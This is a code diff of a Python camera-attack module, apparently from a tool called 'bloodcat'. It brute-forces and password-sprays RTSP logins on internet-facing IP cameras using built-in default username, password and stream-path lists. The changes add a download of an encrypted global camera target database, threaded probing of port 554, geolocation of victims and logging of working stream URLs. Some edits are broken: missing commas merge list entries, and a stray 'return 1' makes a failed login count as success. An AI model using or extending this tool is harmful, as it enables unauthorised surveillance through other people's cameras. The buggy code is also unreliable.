@@ -12,37 +12,46 @@ import time
 import random
 import socket
 import base64
+import json
 import subprocess
 from lib.log_cat import LogCat
-from lib.location import Location 
+from lib.location import Location
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 # from lib.calc_io import calcIO 
 log = LogCat()
 
 
 class CamLib():
     def __init__(self):
-        self.TIMEOUT=5
+        self.KEY = b'S-H4CK13@M4ptnh!' 
+        self.IV = b'14' + b'\x00' * 14    
+        self.DB = 'https://raw.githubusercontent.com/MartinxMax/db/refs/heads/main/blood_cat/global_cam.bc'
+        self.TIMEOUT=3
         self.default_user = "bloodcat"
         self.default_password = "S_H4CK13"
         self.FILE = './data/ipcam.info'
         self.USER = [
             "admin",
-            "administrator",
-            "Administrator",
-            "ADMINISTRATOR",
             "root",
-            "service",
+            "system",
+            "camera"
             "Dinion",
-            "supervisor",
+            "admin1",
+            "Admin",
+            "Admin1",
+            "ubnt",
             "default",
             "888888",
             "666666",
-            "Admin",
-            "Admin1",
-            "admin1",
-            "ubnt",
-            "system",
-            "camera"
+            "service",
+            "supervisor",
+            "administrator",
+            "Administrator",
+            "ADMINISTRATOR",
         ]
         self.USER_AGENTS = [
             "VLC/3.0.18 LibVLC/3.0.18",
@@ -212,8 +221,15 @@ class CamLib():
             "MPV/0.2.0",
             "MPV/0.1.0",
         ]
+
         self.PATH = [
             "/Streaming/Channels/101",
+            "/live",
+            "/0",
+            "/1",
+            "/11",
+            "/12",
+            "/live.sdp",
             "/Streaming/Channels/102",
             "/Streaming/Channels/1",
             "/Streaming/Channels/1601",
@@ -225,14 +241,8 @@ class CamLib():
             "/axis-cgi/mjpg/video.cgi",
             "/axis-cgi/media.cgi",
             "/SNC/media/media.amp",
-            "/live.sdp",
             "/stream1",
             "/stream2",
-            "/live",
-            "/0",
-            "/1",
-            "/11",
-            "/12",
             "/videoMain",
             "/videoSub",
             "/h264",
@@ -263,6 +273,7 @@ class CamLib():
             "/live/h264/HD1080P",
             "/mpeg4/media.amp?resolution=640x480"
         ]
+
         self.PASSWORD = [
             '',
             '000000', '00000000',
@@ -319,15 +330,50 @@ class CamLib():
             '123456789!',
             '123456789abc',
             '123abc!',
+            'secret'
             'fang12345',
             'null', 'NULL',
             'none', 'None', 'NONE'
         ]
 
+    def filter_ips(self,ips):
+        log.info("Filtering cameras...")
+        alive = []
+        with ThreadPoolExecutor(max_workers=5) as pool:
+            future_to_ip = {pool.submit(self.options_no_auth, ip,554): ip for ip in ips}
+            for future in as_completed(future_to_ip):
+                ip = future_to_ip[future]
+                res = future.result()
+
+                if res:
+                    log.info(f"Camera detected: [\033[33m{ip}\033[0m]")
+                    alive.append(ip)
+        return alive
+
+    def get_DB_data(self):
+        def aes_encrypt(data: str) -> bytes:
+            cipher = AES.new(self.KEY, AES.MODE_CBC, self.IV)
+            return cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
+        def aes_decrypt(encrypted: bytes) -> str:
+            cipher = AES.new(self.KEY, AES.MODE_CBC, self.IV)
+            return unpad(cipher.decrypt(encrypted), AES.block_size).decode('utf-8')
+        try:
+            enc = requests.get(self.DB,verify=False).content
+            data = aes_decrypt(enc)
+        except Exception as e:
+            log.error("Unable to update data, please check your network connection...")
+            return False
+        else:
+            return data
+
     def save_info(self, rtsp_url: str, ip_data: str):
+        record = {
+            "rtsp": rtsp_url,
+            "data": ip_data
+        }
         try:
             with open(self.FILE, 'a', encoding='utf-8') as f:
-                f.write(rtsp_url + ' # ' + str(ip_data) + '\n')
+                f.write(json.dumps(record, ensure_ascii=False) + '\n')
         except Exception as e:
             log.error("Failed to save results, check permissions or if the file exists...")
         else:
@@ -337,7 +383,7 @@ class CamLib():
         if password:
             self.PASSWORD = [password]
             log.info(f"Currently entering password spraying : Try Password => [{password}]",f"{password}")
-        log.info(f"Current Detection [{ip}:{port}]",f"{ip}:{port}")
+        
         ip_data = self.show_location(ip)
         if not ip_data:
             return 0
@@ -371,7 +417,7 @@ class CamLib():
             elif code == 404 or code == 400:
                 log.info(f"Path [{path}] does not exist",f"{path}")
             else:
-                log.warning(f"Target returned an unexpected response: [{code}] , please try again later...",f"{path}")
+                log.warning(f"Target returned an unexpected response: [{code}] , please try again later...",f"{code}")
             time.sleep(0.2)
         if paths_no_auth:
             rtsp_url = f"rtsp://{self.default_user}:{self.default_password}@{ip}:{port}{paths_no_auth[0]}"
@@ -400,6 +446,7 @@ class CamLib():
                     return 1
                 else:
                     sys.stdout.write(f"\r☕ ➣ Attempting credentials : [{u}:{p}]\x1b[K")
+                    return 1 # ！！！！！！！！！！！！！！！！！！！！！！！！
                     sys.stdout.flush()
                 time.sleep(0.2)
         else:
@@ -424,8 +471,9 @@ class CamLib():
             return data
         elif code == 1:
             location_ = Location()
-            data = location_.get(ip)   
+            data = location_.get(ip)
             show = f'''\033[33m==========================================
+IP:{ip}
 Country: {data['country']}
 City: {data['city']}
 Lat&Lng: {data['lalo']}
